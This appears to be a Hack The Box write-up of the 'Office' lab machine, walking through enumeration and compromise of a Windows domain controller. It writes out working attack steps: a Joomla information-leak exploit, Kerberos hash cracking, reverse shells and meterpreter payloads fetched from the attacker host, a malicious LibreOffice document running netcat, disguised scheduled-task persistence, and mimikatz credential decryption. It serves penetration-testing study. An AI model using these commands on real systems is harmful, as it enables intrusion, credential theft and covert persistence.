---
date: 2025-03-31
categories: [CTF, HTB]
title: "HTB - Office"
tags: ['bloodhound', 'gobuster', 'hashcat', 'impacket', 'kerberos', 'linux', 'mimikatz', 'nmap', 'powershell', 'privilege escalation', 'python', 'rce', 'reverse shell', 'smb', 'smbmap', 'windows']

description: "Office - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Office

```bash
nmap 10.129.22.81 -Pn -p- -T5

```

![image1](../resources/74f64053ffb5454f82bdfb27e2d13d66.png)

```bash
sudo nmap -sUV -T4 -F --version-intensity 0 10.129.22.81

```

![image2](../resources/77070f70fb124262929cf160ff05f6c8.png)

```bash
nmap 10.129.22.81 -A -sC

```

![image3](../resources/4a30d305065a436aa9c498899363fe49.png)

- Add office.htb to /etc/hosts

- Subdomain enumeration:

```bash
gobuster dns -d office.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r office.htb:53

```

![image4](../resources/0b01ddc2afd946869c439fae0df0d503.png)

- Extension search on office.htb:

```bash
dirsearch -u http://office.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -t 50

```

![image5](../resources/a470af767853447f9f006843d3b1f886.png)

/robots.txt


![image6](../resources/4c15fbb97f2c4786a6b0e7d4accec0fb.png)

- Directory search - same as robots.txt

`dirsearch -u http://office.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50`


![image7](../resources/825614c70d4e4118bef9a2ae3819c103.png)

- Dirsearch the **https**:

```bash
dirsearch -u https://office.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50

```

![image8](../resources/32c9e117d73a443aaf6b4559875b22ce.png)

/joomla


![image9](../resources/c8b5ef6387984dd2814b1bc2c3a24371.png)

https://office.htb/joomla/


![image10](../resources/c49d80faa914407590ffb1d129ca123b.png)

- Given **administrator** - it asks to touch the security key
So we know administrator is a valid user


![image11](../resources/fb8ec42927564a6c950b8a4e86a50a21.png)

- Did another dirsearch on the http domain:

![image12](../resources/a6e851b46d824f2dbedce3d165ab638e.png)

- Joomla version:

![image13](../resources/4319463ad39d4ff380f150a38d2be3e8.png)

- The tool **Juumla** can come in handy to search for vulnerabilities:

![image14](../resources/c39f0c6563c24532a89cd7d4ebbcb96e.png)

**<u>CVE-2023-23752:</u>**

- Googling this version - it has a vulnerability:

**CVE-2023-23752**

<https://vulncheck.com/blog/joomla-for-rce>


![image15](../resources/a62b41fa33874977b66742ade1a8b3a9.png)

- To test for vulnerability:

```bash
curl -v http://office.htb/api/index.php/v1/config/application?public=true

```

![image16](../resources/4d683542a3e1456ca784b79eab0900c7.png)


![image17](../resources/34f5853200d647eca1e185bff11b3331.png)

- There is also a github project that outputs it nicely:
<https://github.com/ThatNotEasy/CVE-2023-23752>


![image18](../resources/366a4025eddf4996bb5d1f33a2c950df.png)

- Joomla SQL DB credentials:
**root : H0lOgrams4reTakIng0Ver754!**

- The SQL DB is only exposed on the localhost so we can't do anything remotely but the password might be
reused for something else

- Leak the user database:

```bash
curl -v http://office.htb/api/index.php/v1/users?public=true

```

![image19](../resources/f4687a38df65433a9fcc581c9c36c163.png)

"name":"Tony Stark","username":"Administrator","email":"**Administrator@holography.htb**"

- Vind valid users:

```bash
./kerbrute userenum --dc 10.129.23.162 -d office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o validusers.txt

cat validusers.txt | grep "VALID" | cut -d ":" -f 4 | cut -d " " -f 2 > users.txt

```
- See if any of them are vulnerable to ASRepRoasting:

```bash
impacket-GetNPUsers office.htb/ -users validusers.txt -no-pass -dc-ip 10.129.23.162

```

![image20](../resources/7fd5519e21814da590ddef59c450ef0f.png)

But none are

- Extract the usernames:

![image21](../resources/87f609fd2f2443f9917c9fbf046e2c78.png)

- Check all the users against the password found for the Joomla SQL DB:

```bash
crackmapexec smb 10.129.23.162 -u users.txt -p "H0lOgrams4reTakIng0Ver754\!"

```

![image22](../resources/103608f7252c4e15ba2cc3090fa1022d.png)

We find a valid user.

```bash
smbmap -H office.htb -u <user_found> -p "H0lOgrams4reTakIng0Ver754\!"

```

![image23](../resources/a1f2495cca8546698dcf630ade8f85e5.png)

```bash
enum4linux -u "<user_found>" -p "H0lOgrams4reTakIng0Ver754\!" -a office.htb

```
(The **-a** IP/host, needs to come at the end)


![image24](../resources/95a6e9cec63a489d8823fb996ddbfbeb.png)

- Domain users:

![image25](../resources/6ad6566e552f4f809e236b2046d6c279.png)

- Bind to SOC Analysis is OK:

![image26](../resources/5261a99e3ad644b29c23c7fd67f77baa.png)

- Domain Groups:

![image27](../resources/6793f7263c88477596b4ea90b5550231.png)

- Connect to share:

```bash
smbclient -U <user_found>%H0lOgrams4reTakIng0Ver754! \\\\office.htb\\"SOC Analysis"

```

![image28](../resources/3c802d7fa11c4cb895527f1c9d61c161.png)

- Download the PCAP

Go to: Statistics -\> Protocol Hierarchy


![image29](../resources/89a7f89c98884dc391471986b94a2c0e.png)

- Apply Kerberos as Filter

![image30](../resources/6e4fe2dbb9bb44949cf62b1f815cc3fb.png)


![image31](../resources/525b7a3b07384678b1fdf705b4247f9d.png)

- Following the stream:

![image32](../resources/2d57638b5f204a34874e6210fe7afe95.png)

- The first line (no.1908) has the smallest length (so least amount of data):
The padata-value tree doesn't have extra information


![image33](../resources/b5a9c418933c405eab405b33cadb6fe5.png)

- Clicking on the one that has the biggest length (no.1917). Expand all Kerberos subtrees:

![image34](../resources/e46d7a957bc84b9383b479e005310c3b.png)

- Go down to **Kerberos -\> as-req -\> padata -\> PA-DATA pA-ENC-TIMESTAMP -\> padata-type -\> padata-value -\> cipher**

- We get the hash:

![image35](../resources/1c3a7d779eb04ef6a3befc19129c64b9.png)

- Copy the value:

![image36](../resources/b3843492d6e249bcadbe05353622da93.png)

**Hash Type:** eTYPE-AES256-CTS-HMAC-SHA1-96 (18)

(Kerberos 5, etype 18, Pre-Auth )

**Hash:** a16f4806da…….a3765386f5fc


![image37](../resources/36379dafa8384a6e973b59d064f74242.png)

- First we need to change it to the right format -
Using the details from the TCP stream and the hashcat wiki:

**\$krb5pa\$18\$tstark\$OFFICE.HTB\$**a16f4806da…….a3765386f5fc

- Crack with hashcat:

```bash
hashcat -m 19900 -a 0 hash /usr/share/wordlists/rockyou.txt

```

![image38](../resources/565b9342d9c34ecf958a7c64af33d6c6.png)

- Found credentials:
**tstark : \<password\>**

From previous enumeration, we know:
- The login page for the Joomla Administration

`http://office.htb/administrator`

- The user Tony Stark (tstark) was leaked from the Joomla database as a SuperUser and his username is **Administrator**

- The password for Administrator is therefore **the same as tstark's** password.

- Login:

![image39](../resources/9952cfbadb7f46d09054e654e8825dc0.png)

- We are met with the admin panel:

![image40](../resources/bf1f341599fc444c99332d9c0c3025e9.png)

- Go to:
**System -\> Templates -\> Site Templates -\> "Template name" (Cassiopeia Details and Files) -\> error.php**


![image41](../resources/c7fb582f8fdc4ef2afc1482431d4c81f.png)


![image42](../resources/a913a4822d734d8fae8b729b378e73c8.png)


![image43](../resources/607e11d97c2345209010a01628a4408e.png)


![image44](../resources/0c7c8195e69a4e6caf320f3f230c11e3.png)

- To get a reverse shell on the **Windows** box:

- Edit **error.php** and add in the PHP Ivan Sincek rev shell:

- Make sure **Shell: powershell**
- ![image45](../resources/8e1dec2bec2d43fda73a620e1f563330.png)
- 
  - Set up listener

- Navigate to  `http://office.htb/templates/cassiopeia/error.php`

- We have a shell as web_account:

![image46](../resources/78569e91c32941d0a788f13f2307214f.png)

```bash
whoami /all

```

![image47](../resources/9371f2466aa7438699ad9d4fa26208da.png)

- More stable meterpreter shell:

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.66 LPORT=4445 -f exe -o shell.exe

```
- Upload meterpreter shell to target :

```bash
(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.66:8082/shell.exe', 'C:\xampp\htdocs\joomla\templates\cassiopeia\shell.exe')

```
- Start meterpreter multi/handler listener on the same port and run the shell.exe on the target

- Download RunasCs:
<https://github.com/antonioCoco/RunasCs/releases/tag/v1.5>

- Upload RunasCs.exe to victim (from meterpreter session):

```bash
upload RunasCs.exe

```
- Create another meterpreter reverse shell on a different port and upload it:

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.66 LPORT=4447 -f exe -o shell2.exe

(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.66:8082/shell2.exe', 'C:\Users\Public\Downloads\shell2.exe')

```
- Set up meterpreter multi/handler listener

- Run:

```bash
RunasCs.exe tstark <password>".\shell2.exe"

```

![image48](../resources/9738abff3bac4637a821f74eed19c902.png)

- We are user tstark:

![image49](../resources/09b3c1a6b9e24a7cae2cc8e3e9c2ef5f.png)


![image50](../resources/4441ad644a3a4913b545f5eba92f251f.png)

```bash
query user

```

![image51](../resources/20a2b5bb8cda407bba33ffa96b05c645.png)

**Ppotts has a session open**

- LibreOffice on a Domain Controller stands out (as well as this room being called Office)

![image52](../resources/035cd71ad81948949d7e79e28c58b169.png)

- Get the version:

```powershell
$libreofficeInstallPath = "C:\Program Files\LibreOffice 5"
$libreofficeVersion = (Get-Item "$libreofficeInstallPath\program\soffice.bin").VersionInfo.FileVersion
Write-Host "LibreOffice Version: $libreofficeVersion"

```

![image53](../resources/cfd58c77af47401e9f04d45c3bca3042.png)

- **CVE-2023-2255:**
<https://github.com/elweth-sec/CVE-2023-2255/blob/main/CVE-2023-2255.py>

Git clone and use the py script to create a malicious file:

```bash
python3 CVE-2023-2255.py --cmd "C:\users\Public\nc.exe 10.10.14.66 5555 -e powershell" --output form.odt

```

![image54](../resources/ef719a30d9ec49a796d0d40d2b9359b1.png)

It injects it in contents.xml:


![image55](../resources/400d2b7a25ec43908adca18b90356678.png)

- Upload nc.exe to the target

- Running netstat -pant on the victim we can see:

![image56](../resources/dff9aa6c1f2844a0a3416393d4b6fbe7.png)

A webserver running on port 8083

- **<u>Create a pivot into the internal network:</u>**

- Upload chisel to the victim

- On Kali:

```bash
chisel server -p 8888 --reverse

```
- On target:

```bash
.\chisel.exe client 10.10.14.66:8888 R:socks

```
- Use proxychains on Kali:

```bash
proxychains nmap office.htb -Pn -sT -vvv

```
- Or to use a browser (if there was an internal web server):
  - Download Foxyproxy
  - Add a proxy - **SOCKS5 127.0.0.1:1080**


![image57](../resources/e0395ecda5fd43299a2561a6cb683102.png)

- Accessing the internal webserver

![image58](../resources/9c907f38db0c4502a5519e82001064e4.png)

- We can upload a form (the malicious form we made):

![image59](../resources/238ac95eb7c444cf8c37e32902a065ed.png)


![image60](../resources/1c0480bb53904c2b9a382ce0aaefa800.png)

- Set up a listener

- Wait for someone to open the form

- Shell as **ppotts**:

![image61](../resources/3173b4315bf048f190a4127a8ea23e0f.png)

whoami /priv


![image62](../resources/18a529b5ceb1424fa0aab5be11d00baf.png)

He has SeMachineAccountPrivilege set.

- Persistence in case we lose the session:

```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.14.66; set lport 4449; exploit"
```

```bash
schtasks /create /sc minute /mo 1 /tn "a_innocent" /tr "C:\users\Public\shellppotts.exe" /ru "ppotts"
```
**<u>Crack DPAPI stored credentials:</u>**

- From cmd:

```bash
vaultcmd /listcreds:"Windows Credentials" /all

```

![image63](../resources/966ddefbdd424725a55ca149cb005829.png)

- From mimikatz

```bash
vault::list

```

![image64](../resources/15b29e3f4b5849c095864e1eca962002.png)


![image65](../resources/8515213ff6474b7096f5e79eed799fbd.png)

**So if it isn't in the directory that mimikatz says, look in the other directories as well**

The files will be hidden, so doing ls or dir won't show anything

![image66](../resources/1dae1fd0410b41c6901cbe1cb00204d8.png)

To view hidden items do:

```bash
Get-Childitem -Hidden C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials

```

![image67](../resources/791c35a315ee4262938b2bbd8a3bc87b.png)

- In Mimikatz:

```bash
dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4

```
Everything is still encrypted but we need to find the correlating Maskterkey (guidMasterKey)


![image68](../resources/38f12de12a1e405292d01b3e8a509b45.png)


![image69](../resources/bdc85a730e71480b984bf67372627bdc.png)


![image70](../resources/0b87541da01548e59742023992cba666.png)

Like this:


![image71](../resources/62f30079c6c441dfa91be4059f017b4a.png)

Here we can see the Masterkey that matches up - **191d3f9d-7959-4b4d-a520-a444853c47eb**

- The cache is empty atm:

```bash
dpapi::cache

```

![image72](../resources/89bdeace409f4e1cb205644f7fa0c358.png)

- Now decrypt the masterkey:

```bash
dpapi::masterkey /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc

```
- Looking at the cache now:

![image73](../resources/fd4fe3b292444486a79237966718caa2.png)

- Now we can decrypt the encrypted credentials:

```bash
dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166

```

![image74](../resources/1985f71d3f77497c8d3ca79cd38d80db.png)

- Each of the files will hold some form of credentials

UserName : OFFICE\\**HHogan**

CredentialBlob : **\<password\>**

- Login with WinRM:

```bash
evil-winrm -i 10.129.24.92 -u hhogan -p "<password>"

```

![image75](../resources/40d4e591da90466b91cee1b418995b88.png)

```bash
whoami /all

```

![image76](../resources/fb07013ed0bc41159218d8cb883d4d60.png)

Hhogan is part of the **GPO Managers**

- Upload Sharphound and run:

```bash
.\SharpHound.exe --CollectionMethods All --Domain office.htb --ZipFileName loot.zip

```
- Looking in BloodHound:
GPO Managers has GenericWrite to the Default Domain Controller Policy.


![image77](../resources/bffd4acdf59b42bca9cdfdf0fc84d2b1.png)

- Download SharpGPOAbuse:
<https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master>

- Copy SharpGPOAbuse.exe to the Windows target machine and run:

```bash
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount hhogan --GPOName "DEFAULT DOMAIN CONTROLLERS POLICY"

```
**OR**

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author office.htb\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators hhogan /add" --GPOName "DEFAULT DOMAIN CONTROLLERS POLICY"

```
(The first one seems to stay whereas this second command, the user gets wiped from the admin group after a few minutes)

```bash
gpupdate /force

```
- Check localgroup:

```bash
net localgroup administrators

```

![image78](../resources/a47445a79c6e4f838056ea647174089a.png)

- HHogan is now part of the local Administrators group:

![image79](../resources/715bb7d4f90e460794ce0af84e8f4d74.png)

- Trying to access to root.flag in the Administrator's directory we get this:

![image80](../resources/c3d6cee1357c4f87905aca1d2603816f.png)

- Close the current evil-winrm session and just relaunch it, and:

![image81](../resources/af2f33abfa0746489cab51a973739d13.png)